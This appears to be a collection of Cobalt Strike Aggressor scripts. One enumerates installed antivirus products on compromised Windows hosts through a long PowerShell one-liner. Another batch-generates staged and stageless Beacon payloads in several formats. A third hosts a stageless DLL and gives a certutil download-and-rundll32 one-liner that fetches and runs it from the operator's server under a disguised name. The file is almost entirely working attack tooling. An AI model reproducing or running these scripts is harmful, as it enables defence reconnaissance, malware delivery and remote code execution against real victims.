#AntiVirus Query
#Author: @r3dQu1nn
#Queries the Registry for AV installed
#Thanks to @i_am_excite and @merrillmatt011 for the help
#Props to @zerosum0x0 for the wmic find!

#Long ass one-liner :)
$powershellcmd = "\$av_list = @(\"BitDefender\", \"Kaspersky\", \"McAfee\", \"Norton\", \"Avast\", \"WebRoot\", \"AVG\", \"ESET\", \"Malware\", \"Windows Defender\");\$av_install = Get-ItemProperty HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*;\$av_install1 = Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*;\$regkey = 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Signature Updates\\';\$av_loop2 = foreach (\$av1 in \$av_list){foreach (\$key in \$av_install){if (\$key.DisplayName -match \$av1 -eq \$TRUE){% {\"{0}|{1}|{2}\" -f \$key.DisplayName.ToString(), \$key.DisplayVersion.ToString(), \$key.InstallDate.ToString()}}}};\$proc_temp = Get-Process;\$av_loop = foreach (\$av in \$av_list){foreach (\$zz in \$proc_temp){if (\$zz.path -match \$av -eq \$TRUE){% {\"{0}|{1}|{2}\" -f \$zz.Id.ToString(), \$zz.Name.Split('\"')[0],  \$zz.Path.ToString()}}}};\$av_loop3 = foreach (\$av2 in \$av_list){foreach (\$key1 in \$av_install1){if (\$key1.DisplayName -match \$av2 -eq \$TRUE){% {\"{0}|{1}|{2}\" -f \$key1.DisplayName.ToString(), \$key1.DisplayVersion.ToString(), \$key1.InstallDate.ToString()}}}};Write-Output \"`nPID|Name|Path`n\";Write-Output \$av_loop;Write-Output \"`nWindows Defender AV Signature Version:\";(Get-ItemProperty -Path \$regkey).ASSignatureVersion;Write-Output \"`nAV Name|Version|Install Date`n\";Write-Output \$av_loop2;Write-Output \$av_loop3";

#AV_Query Command Register
beacon_command_register("AV_Query", "Queries the Registry for AV Installed",
	"Syntax: AV_Query\n" .
	"Checks HKLM hive for All AntiVirus installed");

#AV_Query alias
alias AV_Query {

	blog($1, "\cBDetermining what AntiVirus is installed...");
	bpowerpick!($1, $powershellcmd);
	bpause($1, int(30000));
	bpowerpick!($1, "Get-WmiObject -Namespace \"root\\SecurityCenter2\" -Query \"SELECT * FROM AntiVirusProduct\" | select-object displayName,pathToSignedReportingExe,timestamp| fl");

}

#Automatic Artifact Payload Generator
#Author: @r3dQu1nn
#Generates every type of Stageless/Staged Payload based off a HTTP/HTTPS Listener

#Custom Directory for Payloads
mkdir("/opt/cobaltstrike/Staged_Payloads");
mkdir("/opt/cobaltstrike/Stageless_Payloads");

menubar("Payload Generator", "payloadgenerator");
popup payloadgenerator {
	item "&Automatic Artifact Payload Generator" {
		prompt_confirm("Do you want to generate all the different types of Artifacts?", "Payload Generator Confirmation", {
			show_message("Generating Artifacts...");
			payloadgenerate();
			show_message("Check /opt/cobaltstrike/ for Staged and Stageless Payloads");
		});
	}
}

sub payloadgenerate {
	foreach $name (listeners_local()) {
	$original_listener = $name;
    	$listener_name = lc($name);
        if ($listener_name hasmatch "http" || $listener_name hasmatch "https") {

        	#Staged Payloads
        	$data = artifact_stager($original_listener, "dll");
        	$data2 = artifact_stager($original_listener, "exe");
        	$data3 = artifact_stager($original_listener, "powershell");
        	$data4 = artifact_stager($original_listener, "python");
        	$data5 = artifact_stager($original_listener, "svcexe");
        	$data6 = artifact_stager($original_listener, "vbscript");
        	$data7 = artifact_stager($original_listener, "raw");

	        #Write and Save Payloads
	        $handle = openf(">/opt/cobaltstrike/Staged_Payloads/dllpayload.dll");
		writeb($handle, $data);
		closef($handle);
		$handle2 = openf(">/opt/cobaltstrike/Staged_Payloads/exepayload.exe");
		writeb($handle2, $data2);
		closef($handle2);
		$handle3 = openf(">/opt/cobaltstrike/Staged_Payloads/powershellpayload.ps1");
		writeb($handle3, $data3);
		closef($handle3);
		$handle4 = openf(">/opt/cobaltstrike/Staged_Payloads/pythonpayload.py");
		writeb($handle4, $data4);
		closef($handle4);
		$handle5 = openf(">/opt/cobaltstrike/Staged_Payloads/svcexepayload.exe");
		writeb($handle5, $data5);
		closef($handle5);
		$handle6 = openf(">/opt/cobaltstrike/Staged_Payloads/vbspayload.vbs");
		writeb($handle6, $data6);
		closef($handle6);
		$handle7 = openf(">/opt/cobaltstrike/Staged_Payloads/rawpayload.bin");
		writeb($handle7, $data7);
		closef($handle7);

		#Stageless Payloads
		$data8 = artifact_payload($original_listener, "dll", "x64");
	        $data9 = artifact_payload($original_listener, "exe", "x86");
	        $data10 = artifact_payload($original_listener, "python", "x86");
	        $data11 = artifact_payload($original_listener, "powershell", "x86");
	        $data12 = artifact_payload($original_listener, "raw", "x86");
	        $data13 = artifact_payload($original_listener, "svcexe", "x86");

	        #Write and Save Payloads
		$cradle = openf(">/opt/cobaltstrike/Stageless_Payloads/dllpayload.dll");
		writeb($cradle, $data8);
		closef($cradle);
		$cradle2 = openf(">/opt/cobaltstrike/Stageless_Payloads/exepayload.exe");
		writeb($cradle2, $data9);
		closef($cradle2);
		$cradle3 = openf(">/opt/cobaltstrike/Stageless_Payloads/powershellpayload.ps1");
		writeb($cradle3, $data11);
		closef($cradle3);
		$cradle4 = openf(">/opt/cobaltstrike/Stageless_Payloads/rawpayload.bin");
		writeb($cradle4, $data12);
		closef($cradle4);
		$cradle5 = openf(">/opt/cobaltstrike/Stageless_Payloads/pythonpayload.py");
		writeb($cradle5, $data10);
		closef($cradle5);
		$cradle6 = openf(">/opt/cobaltstrike/Stageless_Payloads/svcexepayload.exe");
		writeb($cradle6, $data13);
		closef($cradle6);
		}
	}
}

# CertUtil Scripted Web Delivery (Stageless)
# Author: @r3dQu1nn
# This script is based off the Scripted Web Delivery created by @armitagehacker, <3 raffi!
# https://gist.github.com/rsmudge/629bd4ddce3bbbca1f8c16378a6a419c
# Please be aware of the default values used in the script
# Thanks to @carnal0wnage and @subTee for the discovery of this type of attack
# https://twitter.com/subTee/status/888071631528235010
# http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html

# setup our stageless CertUtil Web Delivery attack
sub stage_attack {
	local('%options $script $url $arch');
	%options = $3;

	# get the arch right.
	$arch = iff(%options["x64"] eq "true", "x64", "x86");

	# generate our stageless CertUtil script. We're going to make *this* function
	# the callback for this call. That's why we yield after.
	artifact_stageless(%options["listener"], "dll", $arch, $null, $this);
	yield;

	# this function is now resumed after &artifact_stageless finished. $1 is our script.
	$script = $1;

	# host the script
	$url = site_host(%options["host"], %options["port"], %options["uri"], $script, "automatic", "Scripted Web Delivery (CertUtil)"); 

	# tell the user our URL
	prompt_text("Copy/Paste One-liner: ", "powerpick certutil.exe -urlcache -split -f " . $url . " Adobedll.dll; rundll32.exe Adobedll.dll,StartW", {});
	show_message("Be aware of the default values in this script and change them! (Adobedll.dll, dll.txt)");
	elog("powerpick certutil.exe -urlcache -split -f " . $url . " Adobedll.dll; rundll32.exe Adobedll.dll,StartW");

}

# create a popup menu
popup attacks {
	item "CertUtil Web Delivery (S)" {
		local('$dialog %defaults');

		# setup our defaults
		%defaults["uri"]  = "/dll.txt";
		%defaults["host"] = localip();
		%defaults["port"] = 80;

		# create our dialog
		$dialog = dialog("CertUtil Web Delivery (Stageless)", %defaults, &stage_attack);
		dialog_description($dialog, "A stageless version of the CertUtil Web Delivery attack.");
		drow_text($dialog, "uri", "URI Path: ", 20);
		drow_text($dialog, "host", "Local Host: ");
		drow_text($dialog, "port", "Local Port: ");
		drow_listener_stage($dialog, "listener", "Listener: ");
		drow_checkbox($dialog, "x64", "x64: ", "Use x64 payload");
		dbutton_action($dialog, "Launch");

		# show our dialog
		dialog_show($dialog);
	}
}

